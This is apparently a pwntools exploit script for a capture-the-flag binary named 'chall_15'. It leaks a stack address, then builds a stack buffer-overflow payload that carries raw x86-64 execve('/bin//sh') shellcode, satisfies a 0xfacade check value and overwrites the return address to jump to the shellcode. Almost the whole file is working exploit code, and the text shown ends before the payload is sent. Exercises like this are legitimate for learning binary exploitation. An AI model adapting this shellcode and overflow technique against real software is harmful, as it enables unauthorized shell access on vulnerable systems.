from pwn import *
context.arch = 'amd64'

p = process('./chall_15')


# NO CANARY (BOF?) EXECUTABLE STACK == SHELLCODE

# bypass initial fgets
p.sendline(b'junk')

# leaking var_46h

p.recvuntil(b'ms: ')

offset = 0x46
arg = p64(0xfacade)
leak = int(p.recvline().decode('utf-8').strip(), 16)

# basically, have to put 10 bytes of junk, then arg, then immediatelly after arg, put shellcode, then put arg at end of shellcode

shellcode = b'\x6a\x42\x58\xfe\xc4\x48\x99\x52\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5e\x49\x89\xd0\x49\x89\xd2\x0f\x05'

payload = shellcode

amt_away = (offset - 0x4) - len(payload)

payload += cyclic(amt_away)
payload += p32(0xfacade)
payload += cyclic(0x8)
payload += p64(leak)